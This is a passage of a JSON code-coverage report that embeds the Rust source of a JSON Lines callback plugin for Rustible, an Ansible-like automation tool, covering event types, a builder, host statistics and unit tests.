953627],"length":1,"stats":{"Line":1}},{"line":552,"address":[31953753],"length":1,"stats":{"Line":1}},{"line":553,"address":[31953769],"length":1,"stats":{"Line":1}},{"line":554,"address":[31953781],"length":1,"stats":{"Line":1}},{"line":555,"address":[31953797],"length":1,"stats":{"Line":1}},{"line":557,"address":[31953809],"length":1,"stats":{"Line":1}},{"line":558,"address":[31953981,31953929],"length":1,"stats":{"Line":1}},{"line":567,"address":[30824139],"length":1,"stats":{"Line":0}},{"line":568,"address":[31949995],"length":1,"stats":{"Line":0}},{"line":569,"address":[31950044,31950086],"length":1,"stats":{"Line":0}},{"line":574,"address":[31949344,31949372,31949440,31949715,31949797,31949467],"length":1,"stats":{"Line":4}},{"line":575,"address":[31949417,31949516],"length":1,"stats":{"Line":2}},{"line":576,"address":[31949521,31949594],"length":1,"stats":{"Line":2}},{"line":577,"address":[31949736,31949686],"length":1,"stats":{"Line":2}},{"line":582,"address":[30823931],"length":1,"stats":{"Line":0}},{"line":587,"address":[30824077],"length":1,"stats":{"Line":0}},{"line":592,"address":[30824190],"length":1,"stats":{"Line":6}},{"line":594,"address":[31950269],"length":1,"stats":{"Line":1}},{"line":595,"address":[31950286],"length":1,"stats":{"Line":1}},{"line":599,"address":[31950370],"length":1,"stats":{"Line":1}},{"line":600,"address":[31950414,31950471],"length":1,"stats":{"Line":2}},{"line":601,"address":[31950555,31950606],"length":1,"stats":{"Line":1}},{"line":603,"address":[31950591,31950674],"length":1,"stats":{"Line":2}},{"line":604,"address":[31950676,31950646],"length":1,"stats":{"Line":1}},{"line":609,"address":[31950702],"length":1,"stats":{"Line":1}},{"line":613,"address":[31950725,31950791],"length":1,"stats":{"Line":2}},{"line":615,"address":[31950742],"length":1,"stats":{"Line":1}},{"line":616,"address":[31950799],"length":1,"stats":{"Line":1}},{"line":619,"address":[31950858],"length":1,"stats":{"Line":1}},{"line":621,"address":[31952544,31950953,31950980,31951054],"length":1,"stats":{"Line":1}},{"line":624,"address":[31951200,31951951],"length":1,"stats":{"Line":2}},{"line":625,"address":[31952013,31951285,31951384,31952034],"length":1,"stats":{"Line":1}},{"line":628,"address":[31951518,31951587],"length":1,"stats":{"Line":2}},{"line":629,"address":[31951726,31951910,31951603,31951665],"length":1,"stats":{"Line":4}},{"line":630,"address":[31951912,31951781,31951867],"length":1,"stats":{"Line":2}},{"line":635,"address":[31951366],"length":1,"stats":{"Line":1}},{"line":636,"address":[31952133],"length":1,"stats":{"Line":1}},{"line":640,"address":[31952337,31952087],"length":1,"stats":{"Line":2}},{"line":644,"address":[30824371],"length":1,"stats":{"Line":0}},{"line":649,"address":[30824248],"length":1,"stats":{"Line":0}}],"covered":150,"coverable":213},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","json.rs"],"content":"//! JSON Callback Plugin for Rustible\n//!\n//! This module provides a machine-readable JSON callback plugin that outputs\n//! one JSON object per line (JSON Lines / JSONL format), making it suitable\n//! for piping to tools like `jq`, parsing by scripts, or integration with\n//! log aggregation systems.\n//!\n//! ## Features\n//!\n//! - **Streaming JSONL Output**: One complete JSON object per line, no trailing commas\n//! - **Ansible Compatibility**: Output format compatible with Ansible's `json` callback\n//! - **Full Event Metadata**: Timestamps, UUIDs, durations, host info, task results\n//! - **Diff Support**: Optional diff output for changed resources\n//! - **Stats Summary**: Aggregated statistics at playbook completion\n//!\n//! ## Usage\n//!\n//! ```bash\n//! # Basic usage with jq for pretty printing\n//! rustible playbook.yml --callback json | jq\n//!\n//! # Filter for failures only\n//! rustible playbook.yml --callback json | jq 'select(.event == \"task_failed\")'\n//!\n//! # Extract changed tasks\n//! rustible playbook.yml --callback json | jq 'select(.result.changed == true)'\n//!\n//! # Save to file while watching\n//! rustible playbook.yml --callback json | tee execution.jsonl | jq -c\n//! ```\n//!\n//! ## Output Format\n//!\n//! Each line is a self-contained JSON object with an `event` field indicating\n//! the event type. Common fields include:\n//!\n//! - `event`: Event type (playbook_start, task_ok, task_failed, etc.)\n//! - `timestamp`: ISO 8601 timestamp with microsecond precision\n//! - `host`: Target host name (for task events)\n//! - `task`: Task name (for task events)\n//! - `result`: Task result data including changed status, output, etc.\n//!\n//! ## Example Output\n//!\n//! ```json\n//! {\"event\":\"playbook_start\",\"playbook\":\"site.yml\",\"timestamp\":\"2024-01-15T10:30:00.000000Z\"}\n//! {\"event\":\"play_start\",\"play\":\"Configure webservers\",\"hosts\":[\"web1\",\"web2\"],\"timestamp\":\"2024-01-15T10:30:00.100000Z\"}\n//! {\"event\":\"task_start\",\"task\":\"Install nginx\",\"host\":\"web1\",\"timestamp\":\"2024-01-15T10:30:00.200000Z\"}\n//! {\"event\":\"task_ok\",\"task\":\"Install nginx\",\"host\":\"web1\",\"result\":{\"changed\":true,\"success\":true},\"duration_ms\":2500,\"timestamp\":\"2024-01-15T10:30:02.700000Z\"}\n//! {\"event\":\"playbook_end\",\"playbook\":\"site.yml\",\"stats\":{\"web1\":{\"ok\":5,\"changed\":2}},\"duration_ms\":30500,\"success\":true,\"timestamp\":\"2024-01-15T10:30:30.500000Z\"}\n//! ```\n\nuse std::collections::HashMap;\nuse std::io::{self, BufWriter, Write};\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse chrono::{DateTime, Utc};\nuse serde::{Deserialize, Serialize};\nuse serde_json::Value as JsonValue;\nuse tokio::sync::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult, ModuleResult};\n\n// ============================================================================\n// JSON Event Types (Ansible-compatible output format)\n// ============================================================================\n\n/// Base event structure for JSON output.\n/// Each event is serialized as a single JSON line (JSONL format).\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(tag = \"event\", rename_all = \"snake_case\")]\npub enum JsonEvent {\n    /// Playbook execution has started\n    PlaybookStart {\n        /// Name of the playbook\n        playbook: String,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// Playbook execution has ended\n    PlaybookEnd {\n        /// Name of the playbook\n        playbook: String,\n        /// Whether playbook completed successfully\n        success: bool,\n        /// Duration in milliseconds\n        duration_ms: u64,\n        /// Per-host statistics\n        stats: HashMap\u003cString, HostStats\u003e,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// A play has started\n    PlayStart {\n        /// Play name\n        play: String,\n        /// Target hosts\n        hosts: Vec\u003cString\u003e,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// A play has ended\n    PlayEnd {\n        /// Play name\n        play: String,\n        /// Whether play completed successfully\n        success: bool,\n        /// Duration in milliseconds\n        duration_ms: u64,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// A task has started\n    TaskStart {\n        /// Task name\n        task: String,\n        /// Target host\n        host: String,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// A task completed successfully (ok)\n    TaskOk {\n        /// Task name\n        task: String,\n        /// Target host\n        host: String,\n        /// Task result details\n        result: TaskResultJson,\n        /// Duration in milliseconds\n        duration_ms: u64,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// A task completed with changes\n    TaskChanged {\n        /// Task name\n        task: String,\n        /// Target host\n        host: String,\n        /// Task result details\n        result: TaskResultJson,\n        /// Duration in milliseconds\n        duration_ms: u64,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// A task failed\n    TaskFailed {\n        /// Task name\n        task: String,\n        /// Target host\n        host: String,\n        /// Task result details\n        result: TaskResultJson,\n        /// Duration in milliseconds\n        duration_ms: u64,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// A task was skipped\n    TaskSkipped {\n        /// Task name\n        task: String,\n        /// Target host\n        host: String,\n        /// Skip reason message\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        msg: Option\u003cString\u003e,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// A handler was triggered\n    HandlerTriggered {\n        /// Handler name\n        handler: String,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// Facts were gathered from a host\n    FactsGathered {\n        /// Target host\n        host: String,\n        /// Number of facts gathered\n        fact_count: usize,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n        /// Subset of interesting facts (optional, based on verbosity)\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        facts: Option\u003cJsonValue\u003e,\n    },\n\n    /// Warning message\n    Warning {\n        /// Warning message\n        msg: String,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n\n    /// Deprecation notice\n    Deprecation {\n        /// Deprecation message\n        msg: String,\n        /// Version when feature will be removed\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        version: Option\u003cString\u003e,\n        /// ISO 8601 timestamp\n        timestamp: DateTime\u003cUtc\u003e,\n    },\n}\n\n/// Task result data for JSON output\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TaskResultJson {\n    /// Whether the task was successful\n    pub success: bool,\n    /// Whether the task made changes\n    pub changed: bool,\n    /// Result message\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub msg: Option\u003cString\u003e,\n    /// Whether the task was skipped\n    #[serde(skip_serializing_if = \"std::ops::Not::not\")]\n    pub skipped: bool,\n    /// Module-specific result data (when verbose)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub data: Option\u003cJsonValue\u003e,\n    /// Any warnings generated\n    #[serde(skip_serializing_if = \"Vec::is_empty\")]\n    pub warnings: Vec\u003cString\u003e,\n}\n\nimpl From\u003c\u0026ModuleResult\u003e for TaskResultJson {\n    fn from(result: \u0026ModuleResult) -\u003e Self {\n        Self {\n            success: result.success,\n            changed: result.changed,\n            msg: if result.message.is_empty() {\n                None\n            } else {\n                Some(result.message.clone())\n            },\n            skipped: result.skipped,\n            data: result.data.clone(),\n            warnings: result.warnings.clone(),\n        }\n    }\n}\n\n/// Per-host statistics for JSON output\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct HostStats {\n    /// Number of successful tasks (no changes)\n    pub ok: u32,\n    /// Number of tasks that made changes\n    pub changed: u32,\n    /// Number of failed tasks\n    pub failed: u32,\n    /// Number of skipped tasks\n    pub skipped: u32,\n    /// Number of unreachable attempts\n    pub unreachable: u32,\n}\n\nimpl HostStats {\n    /// Check if the host had any failures\n    pub fn has_failures(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n}\n\n// ============================================================================\n// JSON Callback Plugin\n// ============================================================================\n\n/// JSON callback plugin for machine-readable output.\n///\n/// Outputs one JSON object per line (JSONL format) for each event during\n/// playbook execution. This format is ideal for:\n///\n/// - Piping to `jq` for filtering and transformation\n/// - Log aggregation and monitoring systems\n/// - CI/CD pipeline integration\n/// - Automated testing and validation\n///\n/// # Ansible Compatibility\n///\n/// The output format is designed to be compatible with Ansible's json callback\n/// plugin, making it easy to migrate existing tooling that parses Ansible JSON output.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::JsonCallback;\n///\n/// // Create with default settings (stdout, compact JSON)\n/// let callback = JsonCallback::new();\n///\n/// // Create with pretty printing\n/// let callback = JsonCallback::builder()\n///     .pretty(true)\n///     .build();\n///\n/// // Create writing to a file\n/// let callback = JsonCallback::builder()\n///     .output_file(\"/var/log/rustible/execution.jsonl\")\n///     .build();\n/// ```\npub struct JsonCallback {\n    /// Output writer (thread-safe, supports stdout, stderr, or file)\n    writer: Arc\u003cRwLock\u003cBox\u003cdyn Write + Send + Sync\u003e\u003e\u003e,\n    /// Whether to pretty-print JSON (multi-line with indentation)\n    pretty: bool,\n    /// Verbosity level (0 = minimal, 1+ = include more data)\n    verbosity: u8,\n    /// Per-host execution statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Playbook start time for duration tracking\n    start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Play start time for duration tracking\n    play_start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Task start times per host\n    task_start_times: Arc\u003cRwLock\u003cHashMap\u003cString, Instant\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Current play name\n    play_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Whether any failures occurred\n    has_failures: Arc\u003cRwLock\u003cbool\u003e\u003e,\n}\n\nimpl std::fmt::Debug for JsonCallback {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        f.debug_struct(\"JsonCallback\")\n            .field(\"pretty\", \u0026self.pretty)\n            .field(\"verbosity\", \u0026self.verbosity)\n            .field(\"host_stats\", \u0026self.host_stats)\n            .field(\"has_failures\", \u0026self.has_failures)\n            .finish_non_exhaustive()\n    }\n}\n\nimpl JsonCallback {\n    /// Creates a new JSON callback plugin with default settings.\n    ///\n    /// Output goes to stdout in compact (single-line) JSON format.\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self {\n            writer: Arc::new(RwLock::new(Box::new(BufWriter::new(io::stdout())))),\n            pretty: false,\n            verbosity: 0,\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            start_time: Arc::new(RwLock::new(None)),\n            play_start_time: Arc::new(RwLock::new(None)),\n            task_start_times: Arc::new(RwLock::new(HashMap::new())),\n            playbook_name: Arc::new(RwLock::new(None)),\n            play_name: Arc::new(RwLock::new(None)),\n            has_failures: Arc::new(RwLock::new(false)),\n        }\n    }\n\n    /// Creates a builder for configuring the JSON callback.\n    pub fn builder() -\u003e JsonCallbackBuilder {\n        JsonCallbackBuilder::new()\n    }\n\n    /// Returns whether any failures occurred during execution.\n    pub async fn has_failures(\u0026self) -\u003e bool {\n        *self.has_failures.read().await\n    }\n\n    /// Writes a JSON event to the output.\n    async fn write_event(\u0026self, event: \u0026JsonEvent) {\n        let json_result = if self.pretty {\n            serde_json::to_string_pretty(event)\n        } else {\n            serde_json::to_string(event)\n        };\n\n        if let Ok(json_str) = json_result {\n            let mut writer = self.writer.write().await;\n            // JSONL format: one JSON object per line\n            let _ = writeln!(writer, \"{}\", json_str);\n            let _ = writer.flush();\n        }\n    }\n\n    /// Records a task completion and updates host statistics.\n    async fn record_task_result(\u0026self, host: \u0026str, result: \u0026ModuleResult) {\n        let mut stats = self.host_stats.write().await;\n        let host_stats = stats.entry(host.to_string()).or_default();\n\n        if result.skipped {\n            host_stats.skipped += 1;\n        } else if !result.success {\n            host_stats.failed += 1;\n            let mut has_failures = self.has_failures.write().await;\n            *has_failures = true;\n        } else if result.changed {\n            host_stats.changed += 1;\n        } else {\n            host_stats.ok += 1;\n        }\n    }\n\n    /// Gets the task duration for a host.\n    async fn get_task_duration(\u0026self, host: \u0026str) -\u003e u64 {\n        let times = self.task_start_times.read().await;\n        times\n            .get(host)\n            .map(|start| start.elapsed().as_millis() as u64)\n            .unwrap_or(0)\n    }\n}\n\nimpl Default for JsonCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for JsonCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            writer: Arc::clone(\u0026self.writer),\n            pretty: self.pretty,\n            verbosity: self.verbosity,\n            host_stats: Arc::clone(\u0026self.host_stats),\n            start_time: Arc::clone(\u0026self.start_time),\n            play_start_time: Arc::clone(\u0026self.play_start_time),\n            task_start_times: Arc::clone(\u0026self.task_start_times),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            play_name: Arc::clone(\u0026self.play_name),\n            has_failures: Arc::clone(\u0026self.has_failures),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for JsonCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        // Record start time\n        {\n            let mut start_time = self.start_time.write().await;\n            *start_time = Some(Instant::now());\n        }\n\n        // Record playbook name\n        {\n            let mut playbook_name = self.playbook_name.write().await;\n            *playbook_name = Some(name.to_string());\n        }\n\n        // Clear stats from any previous run\n        {\n            let mut stats = self.host_stats.write().await;\n            stats.clear();\n        }\n\n        // Reset failure flag\n        {\n            let mut has_failures = self.has_failures.write().await;\n            *has_failures = false;\n        }\n\n        // Emit event\n        let event = JsonEvent::PlaybookStart {\n            playbook: name.to_string(),\n            timestamp: Utc::now(),\n        };\n        self.write_event(\u0026event).await;\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let duration_ms = {\n            let start_time = self.start_time.read().await;\n            start_time\n                .map(|t| t.elapsed().as_millis() as u64)\n                .unwrap_or(0)\n        };\n\n        let stats = self.host_stats.read().await.clone();\n\n        let event = JsonEvent::PlaybookEnd {\n            playbook: name.to_string(),\n            success,\n            duration_ms,\n            stats,\n            timestamp: Utc::now(),\n        };\n        self.write_event(\u0026event).await;\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Record play start time\n        {\n            let mut play_start_time = self.play_start_time.write().await;\n            *play_start_time = Some(Instant::now());\n        }\n\n        // Record play name\n        {\n            let mut play_name = self.play_name.write().await;\n            *play_name = Some(name.to_string());\n        }\n\n        // Initialize stats for all hosts in this play\n        {\n            let mut stats = self.host_stats.write().await;\n            for host in hosts {\n                stats.entry(host.clone()).or_default();\n            }\n        }\n\n        let event = JsonEvent::PlayStart {\n            play: name.to_string(),\n            hosts: hosts.to_vec(),\n            timestamp: Utc::now(),\n        };\n        self.write_event(\u0026event).await;\n    }\n\n    async fn on_play_end(\u0026self, name: \u0026str, success: bool) {\n        let duration_ms = {\n            let play_start_time = self.play_start_time.read().await;\n            play_start_time\n                .map(|t| t.elapsed().as_millis() as u64)\n                .unwrap_or(0)\n        };\n\n        let event = JsonEvent::PlayEnd {\n            play: name.to_string(),\n            success,\n            duration_ms,\n            timestamp: Utc::now(),\n        };\n        self.write_event(\u0026event).await;\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        // Record task start time\n        {\n            let mut times = self.task_start_times.write().await;\n            times.insert(host.to_string(), Instant::now());\n        }\n\n        let event = JsonEvent::TaskStart {\n            task: name.to_string(),\n            host: host.to_string(),\n            timestamp: Utc::now(),\n        };\n        self.write_event(\u0026event).await;\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let duration_ms = self.get_task_duration(\u0026result.host).await;\n\n        // Update statistics\n        self.record_task_result(\u0026result.host, \u0026result.result).await;\n\n        // Determine event type based on result\n        let task_result = TaskResultJson::from(\u0026result.result);\n\n        let event = if result.result.skipped {\n            JsonEvent::TaskSkipped {\n                task: result.task_name.clone(),\n                host: result.host.clone(),\n                msg: if result.result.message.is_empty() {\n                    None\n                } else {\n                    Some(result.result.message.clone())\n                },\n                timestamp: Utc::now(),\n            }\n        } else if !result.result.success {\n            JsonEvent::TaskFailed {\n                task: result.task_name.clone(),\n                host: result.host.clone(),\n                result: task_result,\n                duration_ms,\n                timestamp: Utc::now(),\n            }\n        } else if result.result.changed {\n            JsonEvent::TaskChanged {\n                task: result.task_name.clone(),\n                host: result.host.clone(),\n                result: task_result,\n                duration_ms,\n                timestamp: Utc::now(),\n            }\n        } else {\n            JsonEvent::TaskOk {\n                task: result.task_name.clone(),\n                host: result.host.clone(),\n                result: task_result,\n                duration_ms,\n                timestamp: Utc::now(),\n            }\n        };\n\n        self.write_event(\u0026event).await;\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        let event = JsonEvent::HandlerTriggered {\n            handler: name.to_string(),\n            timestamp: Utc::now(),\n        };\n        self.write_event(\u0026event).await;\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        // Only include facts in verbose mode\n        let facts_data = if self.verbosity \u003e= 2 {\n            serde_json::to_value(facts).ok()\n        } else {\n            None\n        };\n\n        let event = JsonEvent::FactsGathered {\n            host: host.to_string(),\n            fact_count: facts.all().len(),\n            facts: facts_data,\n            timestamp: Utc::now(),\n        };\n        self.write_event(\u0026event).await;\n    }\n}\n\n// ============================================================================\n// Builder Pattern\n// ============================================================================\n\n/// Builder for configuring JsonCallback with a fluent API.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::JsonCallback;\n///\n/// let callback = JsonCallback::builder()\n///     .pretty(true)\n///     .verbosity(2)\n///     .output_file(\"/var/log/rustible.jsonl\")\n///     .build();\n/// ```\npub struct JsonCallbackBuilder {\n    pretty: bool,\n    verbosity: u8,\n    output: OutputTarget,\n}\n\nenum OutputTarget {\n    Stdout,\n    Stderr,\n    File(String),\n}\n\nimpl JsonCallbackBuilder {\n    /// Create a new builder with default settings.\n    pub fn new() -\u003e Self {\n        Self {\n            pretty: false,\n            verbosity: 0,\n            output: OutputTarget::Stdout,\n        }\n    }\n\n    /// Enable or disable pretty-printing (multi-line indented JSON).\n    ///\n    /// Default is false (compact single-line JSON).\n    pub fn pretty(mut self, enabled: bool) -\u003e Self {\n        self.pretty = enabled;\n        self\n    }\n\n    /// Set the verbosity level.\n    ///\n    /// - 0: Minimal output (event type, basic result)\n    /// - 1: Include messages and warnings\n    /// - 2: Include full result data and facts\n    pub fn verbosity(mut self, level: u8) -\u003e Self {\n        self.verbosity = level;\n        self\n    }\n\n    /// Output to stdout (default).\n    pub fn output_stdout(mut self) -\u003e Self {\n        self.output = OutputTarget::Stdout;\n        self\n    }\n\n    /// Output to stderr.\n    pub fn output_stderr(mut self) -\u003e Self {\n        self.output = OutputTarget::Stderr;\n        self\n    }\n\n    /// Output to a file path.\n    ///\n    /// The file will be created or truncated if it exists.\n    pub fn output_file(mut self, path: impl Into\u003cString\u003e) -\u003e Self {\n        self.output = OutputTarget::File(path.into());\n        self\n    }\n\n    /// Build the JsonCallback.\n    pub fn build(self) -\u003e JsonCallback {\n        let writer: Box\u003cdyn Write + Send + Sync\u003e = match self.output {\n            OutputTarget::Stdout =\u003e Box::new(BufWriter::new(io::stdout())),\n            OutputTarget::Stderr =\u003e Box::new(BufWriter::new(io::stderr())),\n            OutputTarget::File(path) =\u003e {\n                match std::fs::File::create(\u0026path) {\n                    Ok(file) =\u003e Box::new(BufWriter::new(file)),\n                    Err(e) =\u003e {\n                        eprintln!(\"Warning: Could not create output file '{}': {}. Falling back to stdout.\", path, e);\n                        Box::new(BufWriter::new(io::stdout()))\n                    }\n                }\n            }\n        };\n\n        JsonCallback {\n            writer: Arc::new(RwLock::new(writer)),\n            pretty: self.pretty,\n            verbosity: self.verbosity,\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            start_time: Arc::new(RwLock::new(None)),\n            play_start_time: Arc::new(RwLock::new(None)),\n            task_start_times: Arc::new(RwLock::new(HashMap::new())),\n            playbook_name: Arc::new(RwLock::new(None)),\n            play_name: Arc::new(RwLock::new(None)),\n            has_failures: Arc::new(RwLock::new(false)),\n        }\n    }\n}\n\nimpl Default for JsonCallbackBuilder {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_json_callback_tracks_stats() {\n        let callback = JsonCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate some task completions\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result =\n            create_execution_result(\"host2\", \"task1\", false, false, false, \"error occurred\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let skipped_result =\n            create_execution_result(\"host2\", \"task2\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        // Verify stats\n        let stats = callback.host_stats.read().await;\n\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 0);\n        assert_eq!(host1_stats.skipped, 0);\n\n        let host2_stats = stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.ok, 0);\n        assert_eq!(host2_stats.changed, 0);\n        assert_eq!(host2_stats.failed, 1);\n        assert_eq!(host2_stats.skipped, 1);\n\n        assert!(callback.has_failures().await);\n    }\n\n    #[tokio::test]\n    async fn test_json_callback_no_failures() {\n        let callback = JsonCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        assert!(!callback.has_failures().await);\n    }\n\n    #[test]\n    fn test_json_event_serialization() {\n        let event = JsonEvent::PlaybookStart {\n            playbook: \"test.yml\".to_string(),\n            timestamp: Utc::now(),\n        };\n\n        let json = serde_json::to_string(\u0026event).unwrap();\n        assert!(json.contains(\"playbook_start\"));\n        assert!(json.contains(\"test.yml\"));\n    }\n\n    #[test]\n    fn test_task_result_json_from_module_result() {\n        let module_result = ModuleResult {\n            success: true,\n            changed: true,\n            message: \"Package installed\".to_string(),\n            skipped: false,\n            data: Some(serde_json::json!({\"version\": \"1.0\"})),\n            warnings: vec![\"Deprecated feature\".to_string()],\n        };\n\n        let task_result: TaskResultJson = (\u0026module_result).into();\n\n        assert!(task_result.success);\n        assert!(task_result.changed);\n        assert_eq!(task_result.msg, Some(\"Package installed\".to_string()));\n        assert!(!task_result.skipped);\n        assert!(task_result.data.is_some());\n        assert_eq!(task_result.warnings.len(), 1);\n    }\n\n    #[test]\n    fn test_host_stats_has_failures() {\n        let mut stats = HostStats::default();\n        assert!(!stats.has_failures());\n\n        stats.failed = 1;\n        assert!(stats.has_failures());\n\n        stats.failed = 0;\n        stats.unreachable = 1;\n        assert!(stats.has_failures());\n    }\n\n    #[test]\n    fn test_builder_default() {\n        let callback = JsonCallback::builder().build();\n        assert!(!callback.pretty);\n        assert_eq!(callback.verbosity, 0);\n    }\n\n    #[test]\n    fn test_builder_pretty() {\n        let callback = JsonCallback::builder().pretty(true).build();\n        assert!(callback.pretty);\n    }\n\n    #[test]\n    fn test_builder_verbosity() {\n        let callback = JsonCallback::builder().verbosity(2).build();\n        assert_eq!(callback.verbosity, 2);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = JsonCallback::new();\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying state\n        assert!(Arc::ptr_eq(\u0026callback1.host_stats, \u0026callback2.host_stats));\n        assert!(Arc::ptr_eq(\n            \u0026callback1.has_failures,\n            \u0026callback2.has_failures\n        ));\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = JsonCallback::default();\n        assert!(!callback.pretty);\n        assert_eq!(callback.verbosity, 0);\n    }\n\n    #[tokio::test]\n    async fn test_jsonl_output_format() {\n        // Test that events are serialized as valid JSONL\n        let events = vec![\n            JsonEvent::PlaybookStart {\n                playbook: \"test.yml\".to_string(),\n                timestamp: Utc::now(),\n            },\n            JsonEvent::PlayStart {\n                play: \"Configure servers\".to_string(),\n                hosts: vec![\"web1\".to_string(), \"web2\".to_string()],\n                timestamp: Utc::now(),\n            },\n            JsonEvent::TaskOk {\n                task: \"Install nginx\".to_string(),\n                host: \"web1\".to_string(),\n                result: TaskResultJson {\n                    success: true,\n                    changed: false,\n                    msg: None,\n                    skipped: false,\n                    data: None,\n                    warnings: vec![],\n                },\n                duration_ms: 1500,\n                timestamp: Utc::now(),\n            },\n        ];\n\n        for event in events {\n            let json = serde_json::to_string(\u0026event).unwrap();\n            // Verify it's valid JSON\n            let _: JsonValue = serde_json::from_str(\u0026json).unwrap();\n            // Verify no newlines in compact output\n            assert!(!json.contains('\\n'));\n        }\n    }\n\n    #[test]\n    fn test_pretty_output_has_newlines() {\n        let event = JsonEvent::TaskOk {\n            task: \"Install nginx\".to_string(),\n            host: \"web1\".to_string(),\n            result: TaskResultJson {\n                success: true,\n                changed: true,\n                msg: Some(\"Package installed\".to_string()),\n                skipped: false,\n                data: None,\n                warnings: vec![],\n            },\n            duration_ms: 1500,\n            timestamp: Utc::now(),\n        };\n\n        let pretty_json = serde_json::to_string_pretty(\u0026event).unwrap();\n        assert!(pretty_json.contains('\\n'));\n        assert!(pretty_json.contains(\"  \")); // Indentation\n    